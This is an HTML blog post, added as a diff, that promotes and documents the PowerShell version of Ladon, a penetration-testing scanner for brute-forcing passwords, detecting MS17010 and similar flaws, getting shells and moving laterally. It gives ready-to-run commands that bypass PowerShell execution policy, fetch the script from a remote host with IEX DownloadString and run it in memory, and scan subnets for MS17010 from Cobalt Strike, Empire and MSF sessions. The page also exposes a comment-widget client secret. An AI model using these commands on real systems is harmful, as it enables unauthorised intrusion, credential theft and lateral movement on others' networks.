@@ -1,0 +1,456 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Ladon,Tool,PowerShell">
+
+
+<meta name="description" content="
+程序简介
+Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    Ladon Scanner For PowerShell |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="Ladon Scanner For PowerShell">
+            
+            Ladon Scanner For PowerShell
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Ladon/">Ladon</a> <a class="category-link" href="/categories/PowerShell/">PowerShell</a> <a class="category-link" href="/categories/Tool/">工具</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/Ladon/" rel="tag">Ladon</a> <a class="tag-none-link" href="/tags/PowerShell/" rel="tag">PowerShell</a> <a class="tag-none-link" href="/tags/Tool/" rel="tag">Tool</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2019/12/27</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1939</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/Dragon.jpg"></p>
+<h3 id="程序简介">程序简介</h3>
+<p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.5版本内置39个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。<br></p>
+<h3 id="使用说明">使用说明</h3>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>主题</th>
+<th>URL</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Ladon文档主页</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki">https://github.com/k8gege/Ladon/wiki</a><br></td>
+</tr>
+<tr>
+<td>2</td>
+<td>基础用法详解</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/Ladon-Usage">https://github.com/k8gege/Ladon/wiki/Ladon-Usage</a><br></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Cobalt Strike</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-Cobalt-Strike">https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-Cobalt-Strike</a><br></td>
+</tr>
+<tr>
+<td>4</td>
+<td>Exp生成器使用</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a></td>
+</tr>
+<tr>
+<td>5</td>
+<td>高度自定义插件</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></td>
+</tr>
+<tr>
+<td>6</td>
+<td>外部模块参考</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/wiki">https://github.com/k8gege/K8CScan/wiki</a></td>
+</tr>
+<tr>
+<td>7</td>
+<td>PowerLadon</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-PowerShell">https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-PowerShell</a></td>
+</tr>
+<tr>
+<td>8</td>
+<td>PythonLadon</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/PyLadon">https://github.com/k8gege/PyLadon</a></td>
+</tr>
+<tr>
+<td>9</td>
+<td>LinuxLadon</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/LinuxLadon">https://github.com/k8gege/LinuxLadon</a></td>
+</tr>
+<tr>
+<td>10</td>
+<td>漏洞演示视频</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/tree/master/Video">https://github.com/k8gege/K8CScan/tree/master/Video</a></td>
+</tr>
+</tbody>
+</table>
+<h3 id="PowerLadon">PowerLadon</h3>
+<p>PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用<br><br>
+PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。<br><br>
+Ladon.ps1脚本由EXE转换而成，具备EXE版所有功能,相关功能使用请查看Ladon说明文档。<br></p>
+<h3 id="下载">下载</h3>
+<p>最新版本 <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a><br><br>
+历史版本 <a target="_blank" rel="noopener" href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br></p>
+<h4 id="0x001-PowerShell本地加载-br">0x001 PowerShell本地加载<br></h4>
+<p>适用于支持PowerShell交互远控或Shell，如Cobalt Strike</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell </span><br><span class="line">&gt; Import-Module .\Ladon.ps1</span><br><span class="line">&gt; Ladon OnlinePC</span><br></pre></td></tr></tbody></table></figure>
+<p><img data-original="http://k8gege.org/k8img/Ladon/PowerLadon.gif"></p>
+<h4 id="0x002-Cmd本地加载">0x002 Cmd本地加载</h4>
+<p>适用于还没跟上时代的远控或Shell只支持CMD交互</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell Import-Module .\Ladon.ps1;Ladon w</span><br><span class="line"></span><br><span class="line">powershell -<span class="built_in">exec</span> bypass Import-Module .\Ladon.ps1;Ladon <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -<span class="built_in">exec</span> bypass Import-Module .\Ladon.ps1;Ladon <span class="built_in">whoami</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSLadon.gif"></p>
+<p>0x004 Bypass 绕过PowerShell限制</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="Cobalt-Strike">Cobalt Strike</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon 192.168.1.1/24 ms17010</span><br></pre></td></tr></tbody></table></figure>
+<p>0x005 自定义端口扫描</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon PortScan <span class="string">'22,80,135,445'</span></span><br></pre></td></tr></tbody></table></figure>
+<h4 id="Cobalt-Strike-2">Cobalt Strike</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon PortScan <span class="string">'22,80,135,445'</span></span><br></pre></td></tr></tbody></table></figure>
+<h4 id="0x003-Cmd远程加载">0x003 Cmd远程加载</h4>
+<p>适用于还没跟上时代的远控或Shell只支持CMD交互</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br><span class="line">powershell -nop -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon w"</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/CmdPSRemoteLadon.gif"></p>
+<h4 id="0x004-远控交互式CMD">0x004 远控交互式CMD</h4>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_rat.PNG"></p>
+<h4 id="0x005-菜刀非交互CMD">0x005 菜刀非交互CMD</h4>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_cd.PNG"></p>
+<h4 id="0x006-Empire非交互CMD">0x006 Empire非交互CMD</h4>
+<p>Empire的shell有点问题，分号被截断，可以加个cmd /c<br>
+<img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_empire.PNG"></p>
+<h4 id="0x007-MSF交互式CMD">0x007 MSF交互式CMD</h4>
+<p><img data-original="http://k8gege.org/k8img/Ladon/ps/psladon_msf.PNG"></p>
+<p>.TestON</p>
+<p>Win7 x86  (Microsoft Windows [6.1.7601])<br>
+Win8 x64  (Microsoft Windows [6.2.9200])<br>
+Win10 x64 (Microsoft Windows [10.0.14393])<br>
+Win11 x64 (Microsoft Windows [10.0.22000.856]</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/72f1fea6.html" class="pre-post btn btn-default" title="〖工具〗K8tools工具合集">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖工具〗K8tools工具合集</span>
+    </a>
+    
+    
+    <a href="/p/16172.html" class="next-post btn btn-default" title="2011-2019年Top100弱口令密码字典">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            2011-2019年Top100弱口令密码字典</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%AE%80%E4%BB%8B"><span class="toc-text">程序简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E"><span class="toc-text">使用说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerLadon"><span class="toc-text">PowerLadon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD"><span class="toc-text">下载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x001-PowerShell%E6%9C%AC%E5%9C%B0%E5%8A%A0%E8%BD%BD-br"><span class="toc-text">0x001 PowerShell本地加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x002-Cmd%E6%9C%AC%E5%9C%B0%E5%8A%A0%E8%BD%BD"><span class="toc-text">0x002 Cmd本地加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cobalt-Strike"><span class="toc-text">Cobalt Strike</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cobalt-Strike-2"><span class="toc-text">Cobalt Strike</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x003-Cmd%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD"><span class="toc-text">0x003 Cmd远程加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x004-%E8%BF%9C%E6%8E%A7%E4%BA%A4%E4%BA%92%E5%BC%8FCMD"><span class="toc-text">0x004 远控交互式CMD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x005-%E8%8F%9C%E5%88%80%E9%9D%9E%E4%BA%A4%E4%BA%92CMD"><span class="toc-text">0x005 菜刀非交互CMD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x006-Empire%E9%9D%9E%E4%BA%A4%E4%BA%92CMD"><span class="toc-text">0x006 Empire非交互CMD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x007-MSF%E4%BA%A4%E4%BA%92%E5%BC%8FCMD"><span class="toc-text">0x007 MSF交互式CMD</span></a></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
